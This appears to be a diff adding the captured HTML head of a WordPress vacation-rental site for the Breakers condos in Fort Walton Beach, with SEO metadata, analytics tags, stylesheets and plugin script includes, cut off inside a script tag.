@@ -1,0 +1,1785 @@
+notable:
+<link rel="https://api.w.org/" href="https://www.breakersfwb.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://www.breakersfwb.com/wp-json/wp/v2/pages/66" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.breakersfwb.com/xmlrpc.php?rsd" />
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+<!doctype html>
+<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
+<!--[if gt IE 8]><!--> <html lang="en-US"> <!--<![endif]-->
+<head>
+ 
+    <!--=== META TAGS ===-->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta charset="UTF-8" />
+<script type="text/javascript">
+/* <![CDATA[ */
+ var gform;gform||(document.addEventListener("gform_main_scripts_loaded",function(){gform.scriptsLoaded=!0}),document.addEventListener("gform/theme/scripts_loaded",function(){gform.themeScriptsLoaded=!0}),window.addEventListener("DOMContentLoaded",function(){gform.domLoaded=!0}),gform={domLoaded:!1,scriptsLoaded:!1,themeScriptsLoaded:!1,isFormEditor:()=>"function"==typeof InitializeEditor,callIfLoaded:function(o){return!(!gform.domLoaded||!gform.scriptsLoaded||!gform.themeScriptsLoaded&&!gform.isFormEditor()||(gform.isFormEditor()&&console.warn("The use of gform.initializeOnLoaded() is deprecated in the form editor context and will be removed in Gravity Forms 3.1."),o(),0))},initializeOnLoaded:function(o){gform.callIfLoaded(o)||(document.addEventListener("gform_main_scripts_loaded",()=>{gform.scriptsLoaded=!0,gform.callIfLoaded(o)}),document.addEventListener("gform/theme/scripts_loaded",()=>{gform.themeScriptsLoaded=!0,gform.callIfLoaded(o)}),window.addEventListener("DOMContentLoaded",()=>{gform.domLoaded=!0,gform.callIfLoaded(o)}))},hooks:{action:{},filter:{}},addAction:function(o,r,e,t){gform.addHook("action",o,r,e,t)},addFilter:function(o,r,e,t){gform.addHook("filter",o,r,e,t)},doAction:function(o){gform.doHook("action",o,arguments)},applyFilters:function(o){return gform.doHook("filter",o,arguments)},removeAction:function(o,r){gform.removeHook("action",o,r)},removeFilter:function(o,r,e){gform.removeHook("filter",o,r,e)},addHook:function(o,r,e,t,n){null==gform.hooks[o][r]&&(gform.hooks[o][r]=[]);var d=gform.hooks[o][r];null==n&&(n=r+"_"+d.length),gform.hooks[o][r].push({tag:n,callable:e,priority:t=null==t?10:t})},doHook:function(r,o,e){var t;if(e=Array.prototype.slice.call(e,1),null!=gform.hooks[r][o]&&((o=gform.hooks[r][o]).sort(function(o,r){return o.priority-r.priority}),o.forEach(function(o){"function"!=typeof(t=o.callable)&&(t=window[t]),"action"==r?t.apply(null,e):e[0]=t.apply(null,e)})),"filter"==r)return e[0]},removeHook:function(o,r,t,n){var e;null!=gform.hooks[o][r]&&(e=(e=gform.hooks[o][r]).filter(function(o,r,e){return!!(null!=n&&n!=o.tag||null!=t&&t!=o.priority)}),gform.hooks[o][r]=e)}}); 
+/* ]]> */
+</script>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="robots" content="max-image-preview:large">
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-7333KSFTHC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-7333KSFTHC');
+</script>
+	<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-39452259-1"></script>
+<script async>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-39452259-1');
+</script>
+
+	
+    <!--=== LINK TAGS ===-->
+    <link rel="alternate" type="application/rss+xml" title="Breakers RSS2 Feed" href="https://www.breakersfwb.com/feed/" />
+    <link rel="pingback" href="https://www.breakersfwb.com/xmlrpc.php" />
+  
+    <!--=== WP_HEAD() ===-->
+    <meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	
+	<!-- This site is optimized with the Yoast SEO plugin v24.5 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Breakers Fort Walton Beach Resorts | The Top Fort Walton Beach Condos &amp; Rentals</title>
+	<meta name="description" content="Welcome to The Breakers of Fort Walton Beach, FL. Click to book the top condos at gorgeous Fort Walton Beach Resorts today, and plan your dream vacation tomorrow!" />
+	<link rel="canonical" href="https://www.breakersfwb.com/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Breakers Fort Walton Beach Resorts | The Top Fort Walton Beach Condos &amp; Rentals" />
+	<meta property="og:description" content="Welcome to The Breakers of Fort Walton Beach, FL. Click to book the top condos at gorgeous Fort Walton Beach Resorts today, and plan your dream vacation tomorrow!" />
+	<meta property="og:url" content="https://www.breakersfwb.com/" />
+	<meta property="og:site_name" content="Breakers" />
+	<meta property="article:modified_time" content="2025-09-02T18:23:05+00:00" />
+	<meta property="og:image" content="https://www.breakersfwb.com/wp-content/uploads/2023/05/Screenshot-2023-05-15-133020.png" />
+	<meta property="og:image:width" content="1920" />
+	<meta property="og:image:height" content="1080" />
+	<meta property="og:image:type" content="image/png" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="msvalidate.01" content="A723CCC94272C04365B7346558D2B196" />
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//maps.googleapis.com' />
+<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
+<link rel='dns-prefetch' href='//ajax.googleapis.com' />
+<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
+<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' />
+<link rel='dns-prefetch' href='//use.fontawesome.com' />
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.breakersfwb.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.2"}};
+/*! This file is auto-generated */
+!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<link rel='stylesheet' id='twb-open-sans-css' href='https://fonts.googleapis.com/css?family=Open+Sans%3A300%2C400%2C500%2C600%2C700%2C800&#038;display=swap&#038;ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='twbbwg-global-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/booster/assets/css/global.css?ver=1.0.0' type='text/css' media='all' />
+<style id='wp-emoji-styles-inline-css' type='text/css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel='stylesheet' id='wp-block-library-css' href='https://breakersfwb.wpenginepowered.com/wp-includes/css/dist/block-library/style.min.css?ver=6.8.2' type='text/css' media='all' />
+<style id='classic-theme-styles-inline-css' type='text/css'>
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id='pdfemb-pdf-embedder-viewer-style-inline-css' type='text/css'>
+.wp-block-pdfemb-pdf-embedder-viewer{max-width:none}
+
+</style>
+<link rel='stylesheet' id='font-awesome-svg-styles-css' href='https://breakersfwb.wpenginepowered.com/wp-content/uploads/font-awesome/v6.7.2/css/svg-with-js.css' type='text/css' media='all' />
+<style id='font-awesome-svg-styles-inline-css' type='text/css'>
+   .wp-block-font-awesome-icon svg::before,
+   .wp-rich-text-font-awesome-icon svg::before {content: unset;}
+</style>
+<style id='global-styles-inline-css' type='text/css'>
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='bwg_fonts-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/css/bwg-fonts/fonts.css?ver=0.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='sumoselect-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/css/sumoselect.min.css?ver=3.4.6' type='text/css' media='all' />
+<link rel='stylesheet' id='mCustomScrollbar-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/css/jquery.mCustomScrollbar.min.css?ver=3.1.5' type='text/css' media='all' />
+<link rel='stylesheet' id='bwg_googlefonts-css' href='https://fonts.googleapis.com/css?family=Ubuntu&#038;subset=greek,latin,greek-ext,vietnamese,cyrillic-ext,latin-ext,cyrillic' type='text/css' media='all' />
+<link rel='stylesheet' id='bwg_frontend-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/css/styles.min.css?ver=1.8.33' type='text/css' media='all' />
+<link rel='stylesheet' id='fontawesome-css' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='jquery-ui-css-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/assets/dist/css/jquery-ui.min.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='waitme-css-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/waitMe/waitMe.min.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='daterange-picker-css-css' href='https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='multiselect-css' href='https://cdnjs.cloudflare.com/ajax/libs/bootstrap-multiselect/0.9.15/css/bootstrap-multiselect.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='streamline-core-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/assets/dist/css/streamline-core.min.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-components-css' href='https://breakersfwb.wpenginepowered.com/wp-includes/css/dist/components/style.min.css?ver=6.8.2' type='text/css' media='all' />
+<link rel='stylesheet' id='godaddy-styles-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/coblocks/includes/Dependencies/GoDaddy/Styles/build/latest.css?ver=2.0.2' type='text/css' media='all' />
+<link rel='stylesheet' id='main-styles-css' href='https://breakersfwb.wpenginepowered.com/wp-content/themes/bizcor2018/style.css?ver=1744212482' type='text/css' media='' />
+<link rel='stylesheet' id='font-awesome-official-css' href='https://use.fontawesome.com/releases/v6.7.2/css/all.css' type='text/css' media='all' integrity="sha384-nRgPTkuX86pH8yjPJUAFuASXQSSl2/bBUiNV47vSYpKFxHJhbcrGnmlYpYJMeD7a" crossorigin="anonymous" />
+<link rel='stylesheet' id='easy-responsive-shortcodes-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/easy-responsive-shortcodes/css/easy-responsive-shortcodes.css?ver=1.0' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-css' href='https://breakersfwb.wpenginepowered.com/wp-content/plugins/easy-responsive-shortcodes/css/font-awesome.css?ver=4.2.0' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-official-v4shim-css' href='https://use.fontawesome.com/releases/v6.7.2/css/v4-shims.css' type='text/css' media='all' integrity="sha384-npPMK6zwqNmU3qyCCxEcWJkLBNYxEFM1nGgSoAWuCCXqVVz0cvwKEMfyTNkOxM2N" crossorigin="anonymous" />
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/booster/assets/js/circle-progress.js?ver=1.2.2" id="twbbwg-circle-js"></script>
+<script type="text/javascript" id="twbbwg-global-js-extra">
+/* <![CDATA[ */
+var twb = {"nonce":"1070860e7d","ajax_url":"https:\/\/www.breakersfwb.com\/wp-admin\/admin-ajax.php","plugin_url":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/photo-gallery\/booster","href":"https:\/\/www.breakersfwb.com\/wp-admin\/admin.php?page=twbbwg_photo-gallery"};
+var twb = {"nonce":"1070860e7d","ajax_url":"https:\/\/www.breakersfwb.com\/wp-admin\/admin-ajax.php","plugin_url":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/photo-gallery\/booster","href":"https:\/\/www.breakersfwb.com\/wp-admin\/admin.php?page=twbbwg_photo-gallery"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/booster/assets/js/global.js?ver=1.0.0" id="twbbwg-global-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/js/jquery.sumoselect.min.js?ver=3.4.6" id="sumoselect-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/js/tocca.min.js?ver=2.0.9" id="bwg_mobile-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/js/jquery.mCustomScrollbar.concat.min.js?ver=3.1.5" id="mCustomScrollbar-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/js/jquery.fullscreen.min.js?ver=0.6.0" id="jquery-fullscreen-js"></script>
+<script type="text/javascript" id="bwg_frontend-js-extra">
+/* <![CDATA[ */
+var bwg_objectsL10n = {"bwg_field_required":"field is required.","bwg_mail_validation":"This is not a valid email address.","bwg_search_result":"There are no images matching your search.","bwg_select_tag":"Select Tag","bwg_order_by":"Order By","bwg_search":"Search","bwg_show_ecommerce":"Show Ecommerce","bwg_hide_ecommerce":"Hide Ecommerce","bwg_show_comments":"Show Comments","bwg_hide_comments":"Hide Comments","bwg_restore":"Restore","bwg_maximize":"Maximize","bwg_fullscreen":"Fullscreen","bwg_exit_fullscreen":"Exit Fullscreen","bwg_search_tag":"SEARCH...","bwg_tag_no_match":"No tags found","bwg_all_tags_selected":"All tags selected","bwg_tags_selected":"tags selected","play":"Play","pause":"Pause","is_pro":"","bwg_play":"Play","bwg_pause":"Pause","bwg_hide_info":"Hide info","bwg_show_info":"Show info","bwg_hide_rating":"Hide rating","bwg_show_rating":"Show rating","ok":"Ok","cancel":"Cancel","select_all":"Select all","lazy_load":"0","lazy_loader":"https:\/\/www.breakersfwb.com\/wp-content\/plugins\/photo-gallery\/images\/ajax_loader.png","front_ajax":"0","bwg_tag_see_all":"see all tags","bwg_tag_see_less":"see less tags"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/photo-gallery/js/scripts.min.js?ver=1.8.33" id="bwg_frontend-js"></script>
+<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDuM0VpqJo4Ae6N01ZivNRe2ubxJ0jDKF4&amp;ver=6.8.2" id="googlemaps-js-js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sweetalert2@9?ver=6.8.2" id="sweet-js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/richMarker/richmarker.min.js?ver=6.8.2" id="richMarker-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/waitMe/waitMe.min.js?ver=6.8.2" id="waitme-js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/dateFormat/dateFormat.min.js?ver=6.8.2" id="date-format-js-js"></script>
+<script type="text/javascript" id="frontend-js-js-extra">
+/* <![CDATA[ */
+var streamlinecoreConfig = {"ajaxUrl":"https:\/\/www.breakersfwb.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/assets/dist/js/frontend.min.js?ver=6.8.2" id="frontend-js-js"></script>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.3/angular.min.js?ver=6.8.2" id="angularjs-js"></script>
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/angularjs/1.5.3/angular-cookies.min.js?ver=6.8.2" id="angularcookies-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/ng-map/ng-map.min.js?ver=6.8.2" id="ng-maps-js-js"></script>
+<script type="text/javascript" src="https://breakersfwb.wpenginepowered.com/wp-content/plugins/streamline-core-307/vendor/angular-payments/angular-payments.min.js?ver=6.8.2" id="ng-payments-js-js"></script>
+<script type="text/javascript" id="resortpro-js-extra">
+/* <![CDATA[ */
